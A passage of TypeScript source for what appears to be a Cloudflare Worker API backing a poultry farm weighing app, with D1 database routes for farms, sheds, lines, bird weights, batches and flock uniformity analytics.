    if (url.pathname.startsWith('/api')) {
      try {
        const path = url.pathname.replace(/^\/api/, '') || '/';

        // Health check endpoint: GET /api/health
        if (path === '/health' || path === '/health/') {
          return jsonResponse({
            status: 'ok',
            connected: true,
            database: { status: 'connected', provider: 'cloudflare-d1' },
          });
        }

        // -------------------------------------------------------------
        // A. HIERARCHY ENDPOINTS: GET /api/hierarchy, POST /api/hierarchy
        // -------------------------------------------------------------
        if (path === '/hierarchy' || path === '/hierarchy/') {
          if (method === 'GET') {
            const farmId = url.searchParams.get('farmId');
            if (!env.DB) {
              return jsonResponse({
                farms: [],
                message: 'D1 binding not initialized yet in local test mode.',
              });
            }

            const farmQuery = farmId
              ? await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmQuery.results || [];
            const fullHierarchy: any[] = [];

            for (const f of farms) {
              const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(f.id).all();
              const sheds = shedsRes.results || [];
              const shedList: any[] = [];

              for (const s of sheds) {
                const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
                const parts = partsRes.results || [];
                const partList: any[] = [];

                for (const p of parts) {
                  const linesRes = await env.DB.prepare(
                    'SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC'
                  ).bind(p.id).all();
                  const lines = linesRes.results || [];
                  const lineList: any[] = [];

                  for (const l of lines) {
                    const weightsRes = await env.DB.prepare(
                      'SELECT weight_grams FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC'
                    ).bind(l.id).all();
                    const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);

                    lineList.push({
                      id: l.id,
                      name: l.name,
                      lineNumber: l.line_number,
                      gender: l.gender, // 'MALE' | 'FEMALE'
                      stdWeight: l.std_weight_grams,
                      targetBirdCount: l.target_bird_count,
                      weights,
                    });
                  }

                  partList.push({
                    id: p.id,
                    name: p.name,
                    lines: lineList,
                  });
                }

                shedList.push({
                  id: s.id,
                  name: s.name,
                  targetBirdCount: s.target_bird_count,
                  lockedByUserId: s.locked_by_user_id || null,
                  lockedByUserName: s.locked_by_user_name || null,
                  lockedAt: s.locked_at || null,
                  lastHeartbeatAt: s.last_heartbeat_at || null,
                  recordedByUserId: s.recorded_by_user_id || null,
                  recordedByUserName: s.recorded_by_user_name || null,
                  parts: partList,
                });
              }

              fullHierarchy.push({
                ...f,
                sheds: shedList,
              });
            }

            return jsonResponse({ success: true, farms: fullHierarchy });
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });

            const farmId = body.farmId || `farm-${Date.now()}`;
            const farmName = body.name || 'New Farm';
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';

            await env.DB.prepare(
              'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET name=excluded.name, updated_at=CURRENT_TIMESTAMP'
            ).bind(farmId, farmName, season, ageWeek).run();

            return jsonResponse({ success: true, farmId });
          }
        }

        // -------------------------------------------------------------
        // B0. PARTS ENDPOINTS (POST /api/parts, PUT /api/parts/:id, DELETE /api/parts/:id)
        // -------------------------------------------------------------
        if ((path === '/parts' || path === '/parts/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const shedId = body.shedId || body.shed_id;
          const name = (body.name || 'Part A').trim();
          if (!shedId) return errorResponse('Missing shedId', 400);

          const partId = `part-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
          if (env.DB) {
            await env.DB.prepare(
              'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
            ).bind(partId, shedId, name).run().catch((err) => {
              console.error('Error adding part:', err);
            });
          }

          return jsonResponse({ id: partId, shedId, name, lines: [] }, 201);
        }

        const singlePartMatch = path.match(/^\/parts\/([^/]+)$/);
        if (singlePartMatch && method === 'PUT') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const name = (body.name || '').trim();
          if (env.DB && name) {
            await env.DB.prepare('UPDATE parts SET name = ? WHERE id = ?').bind(name, partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part updated' });
        }

        if (singlePartMatch && method === 'DELETE') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id IN (SELECT id FROM lines WHERE part_id = ?)').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE part_id = ?').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM parts WHERE id = ?').bind(partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part deleted' });
        }

        // -------------------------------------------------------------
        // B1. LINES ENDPOINTS (POST /api/lines, PUT /api/lines/:id, DELETE /api/lines/:id)
        // -------------------------------------------------------------
        if ((path === '/lines' || path === '/lines/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const partId = body.partId || body.part_id;
          if (!partId) return errorResponse('Missing partId', 400);

          let lineNum = body.lineNumber;
          if (!lineNum && env.DB) {
            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM lines WHERE part_id = ?').bind(partId).first() as any;
            lineNum = (countRes?.count || 0) + 1;
          } else if (!lineNum) {
            lineNum = 1;
          }

          const lineName = body.name || `Line ${lineNum}`;
          const gender = (body.gender || 'MALE').toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
          const lineId = `line-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams, target_bird_count)
              VALUES (?, ?, ?, ?, ?, 140, 50)
            `).bind(lineId, partId, lineNum, lineName, gender).run().catch((err) => {
              console.error('Error adding line:', err);
            });
          }

          return jsonResponse({ id: lineId, partId, lineNumber: lineNum, name: lineName, gender, weights: [] }, 201);
        }

        const singleLineMatch = path.match(/^\/lines\/([^/]+)$/);
        if (singleLineMatch && method === 'PUT') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE lines SET name = ? WHERE id = ?').bind(body.name, lineId).run().catch(() => {});
            }
            if (body.gender) {
              const g = body.gender.toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
              await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(g, lineId).run().catch(() => {});
            }
          }
          return jsonResponse({ success: true, message: 'Line updated' });
        }

        if (singleLineMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          if (env.DB) {
            const line = await env.DB.prepare('SELECT part_id FROM lines WHERE id = ?').bind(lineId).first() as any;
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE id = ?').bind(lineId).run().catch(() => {});

            // Auto-reindex remaining lines in that part sequentially from Line 1
            if (line?.part_id) {
              const remRes = await env.DB.prepare('SELECT id FROM lines WHERE part_id = ? ORDER BY line_number ASC, rowid ASC').bind(line.part_id).all().catch(() => ({ results: [] }));
              const remLines = (remRes.results || []) as any[];
              for (let i = 0; i < remLines.length; i++) {
                const nextNum = i + 1;
                await env.DB.prepare('UPDATE lines SET line_number = ?, name = ? WHERE id = ?').bind(nextNum, `Line ${nextNum}`, remLines[i].id).run().catch(() => {});
              }
            }
          }
          return jsonResponse({ success: true, message: 'Line deleted' });
        }

        // -------------------------------------------------------------
        // B. LINE GENDER ENDPOINT: PATCH /api/lines/:id/gender
        // -------------------------------------------------------------
        const lineGenderMatch = path.match(/^\/lines\/([^/]+)\/gender$/);
        if (lineGenderMatch && method === 'PATCH') {
          const lineId = decodeURIComponent(lineGenderMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const gender = (body.gender || '').toUpperCase();

          if (gender !== 'MALE' && gender !== 'FEMALE') {
            return errorResponse('Invalid gender. Must be MALE or FEMALE', 400);
          }

          if (!env.DB) {
            return jsonResponse({ success: true, lineId, gender, note: 'Simulated D1 mode' });
          }

          // Fetch flock age/week to look up new STD
          const lineInfo = await env.DB.prepare(`
            SELECT l.id, l.name, l.part_id, f.flock_age_days, f.age_week
            FROM lines l
            JOIN parts p ON l.part_id = p.id
            JOIN sheds s ON p.shed_id = s.id
            JOIN farms f ON s.farm_id = f.id
            WHERE l.id = ?
          `).bind(lineId).first() as any;

          let stdWeight = gender === 'MALE' ? 150 : 140;
          if (lineInfo) {
            const weekNum = parseInt(String(lineInfo.age_week || 'W1').replace(/\D/g, '') || '1', 10);
            const stdLookup = await env.DB.prepare(
              'SELECT std_weight_grams FROM standard_weights WHERE age_week = ? AND gender = ?'
            ).bind(weekNum, gender).first() as any;
            if (stdLookup && stdLookup.std_weight_grams) {
              stdWeight = stdLookup.std_weight_grams;
            }
          }

          await env.DB.prepare(
            'UPDATE lines SET gender = ?, std_weight_grams = ? WHERE id = ?'
          ).bind(gender, stdWeight, lineId).run();

          return jsonResponse({
            success: true,
            lineId,
            gender,
            stdWeightGrams: stdWeight,
            message: `Line gender updated to ${gender} with STD ${stdWeight}g`,
          });
        }

        // -------------------------------------------------------------
        // C. WEIGHTS ENDPOINTS: POST /api/weights, DELETE /api/weights
        // -------------------------------------------------------------
        if (path === '/weights' || path === '/weights/') {
          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const { lineId, weight, entryIndex, recordedBy, week } = body;

            if (!lineId || weight === undefined || weight === null) {
              return errorResponse('Missing required fields: lineId and weight', 400);
            }

            const weightGrams = Number(weight);
            if (isNaN(weightGrams) || weightGrams <= 0) {
              return errorResponse('Weight must be a positive number', 400);
            }

            if (!env.DB) {
              return jsonResponse({ success: true, id: `w-${Date.now()}`, weightGrams });
            }

            // Get current line STD
            const line = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
            const stdWeightAtEntry = line?.std_weight_grams || 140;

            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
            const finalIndex = entryIndex !== undefined ? entryIndex : (countRes?.count || 0) + 1;
            const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

            await env.DB.prepare(
              'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
            ).bind(weightId, lineId, finalIndex, weightGrams, stdWeightAtEntry, recordedBy || 'Operator', week || 'W1').run();

            return jsonResponse({
              success: true,
              id: weightId,
              lineId,
              entryIndex: finalIndex,
              weightGrams,
              stdWeightAtEntry,
            });
          }

          if (method === 'DELETE') {
            const body = await request.json().catch(() => ({})) as any;
            const { id, lineId, index, clearAll } = body;

            if (!env.DB) return jsonResponse({ success: true });

            if (clearAll && lineId) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
              return jsonResponse({ success: true, message: `Cleared all weights in line ${lineId}` });
            }

            if (id) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(id).run();
              return jsonResponse({ success: true, message: `Deleted weight ${id}` });
            }

            if (lineId && index !== undefined) {
              // Delete by line and order index
              const target = await env.DB.prepare(
                'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
              ).bind(lineId, index).first() as any;

              if (target?.id) {
                await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
              }
              return jsonResponse({ success: true, message: `Deleted weight at index ${index}` });
            }

            return errorResponse('Specify weight id, clearAll, or lineId and index', 400);
          }
        }

        // Sub-routes for weights on lines:
        // POST /api/lines/:id/weight
        // DELETE /api/lines/:id/weight/:index
        // POST /api/lines/:id/clear
        const lineWeightMatch = path.match(/^\/lines\/([^/]+)\/weight$/);
        if (lineWeightMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineWeightMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const weightGrams = Number(body.weight);

          if (!env.DB) return jsonResponse({ success: true, weight: weightGrams });

          const line = await env.DB.prepare('SELECT std_weight_grams FROM lines WHERE id = ?').bind(lineId).first() as any;
          const stdWeightAtEntry = line?.std_weight_grams || 140;
          const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
          const nextIndex = (countRes?.count || 0) + 1;
          const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          await env.DB.prepare(
            'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
          ).bind(weightId, lineId, nextIndex, weightGrams, stdWeightAtEntry, body.userName || 'Operator', body.week || 'W1').run();

          return jsonResponse({ success: true, id: weightId, weight: weightGrams });
        }

        const lineDeleteWeightMatch = path.match(/^\/lines\/([^/]+)\/weight\/(\d+)$/);
        if (lineDeleteWeightMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(lineDeleteWeightMatch[1]);
          const index = parseInt(lineDeleteWeightMatch[2], 10);

          if (!env.DB) return jsonResponse({ success: true });

          const target = await env.DB.prepare(
            'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
          ).bind(lineId, index).first() as any;

          if (target?.id) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
          }

          return jsonResponse({ success: true });
        }

        const lineClearMatch = path.match(/^\/lines\/([^/]+)\/clear$/);
        if (lineClearMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineClearMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
          }
          return jsonResponse({ success: true, message: `Weights cleared for line ${lineId}` });
        }

        // -------------------------------------------------------------
        // D. ADMIN ANALYTICS ENDPOINT: GET /api/admin/analytics
        // Computes AVG WT, STD, Uniformity %, CV % dynamically per Line Gender
        // -------------------------------------------------------------
        if ((path === '/admin/analytics' || path === '/admin/analytics/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) {
            return jsonResponse({
              analytics: {
                totalBirds: 0,
                femaleAvg: 0,
                maleAvg: 0,
                femaleUniformity: 0,
                maleUniformity: 0,
                linesBreakdown: [],
              },
            });
          }

          const linesQuery = farmId
            ? await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                WHERE s.farm_id = ?
                ORDER BY s.name, p.name, l.line_number
              `).bind(farmId).all()
            : await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                ORDER BY s.name, p.name, l.line_number
              `).all();

          const allLines = linesQuery.results || [];
          const linesBreakdown: any[] = [];

          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];

          for (const l of allLines) {
            const weightsRes = await env.DB.prepare(
              'SELECT weight_grams FROM bird_weights WHERE line_id = ?'
            ).bind(l.id).all();
            const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

            const count = weights.length;
            const sum = weights.reduce((a: number, b: number) => a + b, 0);
            const avg = count > 0 ? Math.round((sum / count) * 10) / 10 : 0;
            const std = l.std_weight_grams || (l.gender === 'MALE' ? 150 : 140);

            // Uniformity: percentage within std ± 10%
            const lowerBand = std * 0.9;
            const upperBand = std * 1.1;
            const inRangeCount = count > 0 ? weights.filter((w: number) => w >= lowerBand && w <= upperBand).length : 0;
            const uniformityPct = count > 0 ? Math.round((inRangeCount / count) * 1000) / 10 : 0;

            // CV% (Coefficient of variation: Standard Deviation / Mean * 100)
            let cv = 0;
            if (count > 1 && avg > 0) {
              const variance = weights.reduce((acc: number, val: number) => acc + Math.pow(val - avg, 2), 0) / (count - 1);
              const stdDev = Math.sqrt(variance);
              cv = Math.round((stdDev / avg) * 10000) / 100;
            }

            if (l.gender === 'FEMALE') {
              allFemaleWeights.push(...weights);
            } else {
              allMaleWeights.push(...weights);
            }

            linesBreakdown.push({
              lineId: l.id,
              lineName: l.line_name,
              shedName: l.shed_name,
              partName: l.part_name,
              gender: l.gender,
              stdWeight: std,
              birdCount: count,
              averageWeight: avg,
              uniformityPercent: uniformityPct,
              cvPercent: cv,
            });
          }

          const calcGroupStats = (weightsList: number[]) => {
            const count = weightsList.length;
            if (count === 0) return { count: 0, avg: 0, uniformity: 0 };
            const avg = Math.round((weightsList.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const inRange = weightsList.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            return {
              count,
              avg,
              uniformity: Math.round((inRange / count) * 1000) / 10,
            };
          };

          return jsonResponse({
            success: true,
            analytics: {
              totalBirds: allFemaleWeights.length + allMaleWeights.length,
              female: calcGroupStats(allFemaleWeights),
              male: calcGroupStats(allMaleWeights),
              linesBreakdown,
            },
          });
        }

        // -------------------------------------------------------------
        // E. FARMS REST ENDPOINTS: GET /api/farms, POST /api/farms
        // -------------------------------------------------------------
        if (path === '/farms' || path === '/farms/') {
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse([]);
            }
            await ensureBatchesTable(env);
            const includeArchived = url.searchParams.get('includeArchived') === 'true';
            const farmsRes = includeArchived
              ? await env.DB.prepare('SELECT * FROM farms ORDER BY created_at DESC').all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmsRes.results || [];
            const summaries: any[] = [];

            const allUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const allUsers = (allUsersRes.results || []) as any[];

            for (const f of farms) {
              const activeBatch = await ensureFarmActiveBatch(env, f);
              const shedCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM sheds WHERE farm_id = ?').bind(f.id).first() as any;
              const subCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM submissions WHERE farm_id = ?').bind(f.id).first() as any;

              const assignedUsers = allUsers.filter(u => {
                if (u.assigned_farm_id === f.id) return true;
                try {
                  const list = JSON.parse(u.assigned_farms || '[]');
                  return Array.isArray(list) && (list.includes(f.id) || list.includes(f.name));
                } catch {
                  return false;
                }
              });
              const assignedUserNames = assignedUsers.map(u => {
                const r = (u.role || '').toUpperCase();
                const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
                return `${u.name} (${display})`;
              });

              summaries.push({
                id: f.id,
                name: f.name,
                location: f.location,
                flockDate: activeBatch?.startDate || f.flock_date || f.created_at,
                ageWeek: f.age_week || 'W1',
                season: f.season || 'Summer',
                updatedAt: f.updated_at || f.created_at,
                isArchived: Boolean(f.is_archived),
                activeBatch,
                startDate: activeBatch?.startDate || f.flock_date,
                startWeekNumber: activeBatch?.startWeekNumber || 1,
                assignedUserNames,
                _count: {
                  sheds: shedCountRes?.count || 0,
                  submissions: subCountRes?.count || 0,
                },
              });
            }

            return jsonResponse(summaries);
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const farmId = `farm-${Date.now()}`;
            const farmName = (body.name || 'New Farm').trim();
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';
            const flockDate = body.flockDate || new Date().toISOString().split('T')[0];
            const shedCount = Math.min(Math.max(Number(body.shedCount) || 10, 1), 40);

            const createdSheds: any[] = [];
            const startWeekNum = parseInt(String(ageWeek || 'W1').replace(/\D/g, '') || '1', 10);
            const batchId = `batch-${farmId}-1`;

            if (env.DB) {
              await ensureBatchesTable(env);
              await env.DB.prepare(
                'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, ?)'
              ).bind(farmId, farmName, season, ageWeek, flockDate).run();

              // Automatically initialize default Batch 1 for the new farm
              await env.DB.prepare(`
                INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
                VALUES (?, ?, 'Batch 1', ?, ?, 'ACTIVE')
              `).bind(batchId, farmId, flockDate, startWeekNum).run().catch(() => {});
            }

            // Pre-create sheds, parts, and lines with Line-level Gender and empty weights
            for (let sIdx = 1; sIdx <= shedCount; sIdx++) {
              const shedId = `shed-${farmId}-${sIdx}`;
              const shedName = `Shed ${sIdx}`;
              if (env.DB) {
                await env.DB.prepare(
                  'INSERT INTO sheds (id, farm_id, name) VALUES (?, ?, ?)'
                ).bind(shedId, farmId, shedName).run().catch(() => {});
              }

              const partsList: any[] = [];
              // 2 Parts per shed
              for (let pIdx = 1; pIdx <= 2; pIdx++) {
                const partId = `part-${shedId}-${pIdx}`;
                const partName = pIdx === 1 ? 'Part 1' : 'Part 2';
                if (env.DB) {
                  await env.DB.prepare(
                    'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
                  ).bind(partId, shedId, partName).run().catch(() => {});
                }

                const linesList: any[] = [];
                // 5 Lines per part
                for (let lIdx = 1; lIdx <= 5; lIdx++) {
                  const lineId = `line-${partId}-${lIdx}`;
                  // Default to FEMALE for main grower lines, MALE for line 5
                  const gender = (sIdx === shedCount || lIdx === 5) ? 'MALE' : 'FEMALE';
                  const std = gender === 'MALE' ? 150 : 140;

                  if (env.DB) {
                    await env.DB.prepare(
                      'INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams) VALUES (?, ?, ?, ?, ?, ?)'
                    ).bind(lineId, partId, lIdx, `Line ${lIdx}`, gender, std).run().catch(() => {});
                  }

                  linesList.push({
                    id: lineId,
                    name: `Line ${lIdx}`,
                    lineNumber: lIdx,
                    gender,
                    stdWeight: std,
                    targetBirdCount: 0,
                    weights: [],
                  });
                }

                partsList.push({
                  id: partId,
                  name: partName,
                  lines: linesList,
                });
              }

              createdSheds.push({
                id: shedId,
                farmId,
                name: shedName,
                type: sIdx === shedCount ? 'Male' : 'Female',
                targetBirdCount: 0,
                locked: false,
                lockedByUserId: null,
                lockedByUserName: null,
                lockedAt: null,
                lastHeartbeatAt: null,
                recordedByUserId: null,
                recordedByUserName: null,
                birdCount: 0,
                weights: [],
                status: 'PENDING',
                savedStatus: 'PENDING',
                totalBirdCount: 0,
                parts: partsList,
              });
            }

            return jsonResponse({
              id: farmId,
              name: farmName,
              season,
              ageWeek,
              flockDate,
              shedCount,
              sheds: createdSheds,
              activeBatch: {
                id: batchId,
                farmId,
                batchName: 'Batch 1',
                startDate: flockDate,
                startWeekNumber: startWeekNum,
                status: 'ACTIVE',
              },
            }, 201);
          }
        }

        // -------------------------------------------------------------
        // E2. BATCHES REST ENDPOINTS: GET & POST /api/farms/:id/batches
        // -------------------------------------------------------------
        const farmBatchesMatch = path.match(/^\/farms\/([^/]+)\/batches$/);
        if (farmBatchesMatch) {
          const farmId = decodeURIComponent(farmBatchesMatch[1]);
          if (method === 'GET') {
            if (!env.DB) return jsonResponse({ success: true, batches: [] });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            await ensureFarmActiveBatch(env, farm);
            const batchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all();

            const batches = (batchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
              createdAt: b.created_at,
              updatedAt: b.updated_at,
            }));

            return jsonResponse({ success: true, batches });
          }

          if (method === 'POST') {
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const body = await request.json().catch(() => ({})) as any;

            // 1. Mark existing batches as COMPLETED (read-only)
            await env.DB.prepare(
              'UPDATE batches SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE farm_id = ?'
            ).bind('COMPLETED', farmId).run();

            // 2. Determine new batch name
            const countRes = await env.DB.prepare(
              'SELECT COUNT(*) as count FROM batches WHERE farm_id = ?'
            ).bind(farmId).first() as any;
            const count = (countRes?.count || 0) + 1;
            const batchName = (body.batchName || `Batch ${count}`).trim();
            const startDate = body.startDate || new Date().toISOString().split('T')[0];
            const startWeekNumber = Number(body.startWeekNumber) || 1;
            const batchId = `batch-${farmId}-${Date.now()}`;

            // 3. Create new ACTIVE batch
            await env.DB.prepare(`
              INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
              VALUES (?, ?, ?, ?, ?, 'ACTIVE')
            `).bind(batchId, farmId, batchName, startDate, startWeekNumber).run();

            // 4. Release any active locks so new batch starts fresh
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL
              WHERE farm_id = ?
            `).bind(farmId).run().catch(() => {});

            const newBatch = {
              id: batchId,
              farmId,
              batchName,
              startDate,
              startWeekNumber,
              status: 'ACTIVE',
            };

            return jsonResponse({
              success: true,
              batch: newBatch,
              message: `Started ${batchName} successfully for farm ${farm.name}.`,
            }, 201);
          }
        }

        // GET /api/farms/:id
        const singleFarmMatch = path.match(/^\/farms\/([^/]+)$/);
        if (singleFarmMatch) {
          const farmId = decodeURIComponent(singleFarmMatch[1]);
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse({ id: farmId, name: 'Active Farm', sheds: [] });
            }

            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const requestedBatchId = url.searchParams.get('batchId');
            const targetBatchId = requestedBatchId || activeBatch?.id;

            // Fetch all batches for this farm
            const allBatchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all().catch(() => ({ results: [] }));
            const batchesList = (allBatchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
            }));

            // Check if selected batch is the initial/first batch for legacy backward compatibility
            const firstBatch = batchesList.length > 0 ? batchesList[batchesList.length - 1] : null;
            const isInitialBatch = Boolean(firstBatch && firstBatch.id === targetBatchId);

            const targetWeek = (url.searchParams.get('week') || farm.age_week || 'W18').toUpperCase();

            // Check if submission exists for this specific week and batch
            const subForWeek = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any
              : await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND batch_id = ? ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any;

            // Fetch shed saves for this week and batch from shed_week_status
            const shedWeekStatuses = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }))
              : await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND batch_id = ?'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }));
            const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

            const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
            const sheds: any[] = [];
            let totalFarmBirds = 0;
            let savedShedsCount = 0;

            for (const s of shedsRes.results || []) {
              const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
              const parts: any[] = [];
              let shedBirdCount = 0;

              for (const p of partsRes.results || []) {
                const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
                const lines: any[] = [];

                for (const l of linesRes.results || []) {
                  // Strictly filter weights by line_id, targetWeek AND batch
                  const weightsRes = isInitialBatch
                    ? await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all()
                    : await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND batch_id = ? ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all();

                  const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);
                  shedBirdCount += weights.length;

                  lines.push({
                    id: l.id,
                    name: l.name,
                    gender: l.gender,
                    weights,
                  });
                }

                parts.push({
                  id: p.id,
                  name: p.name,
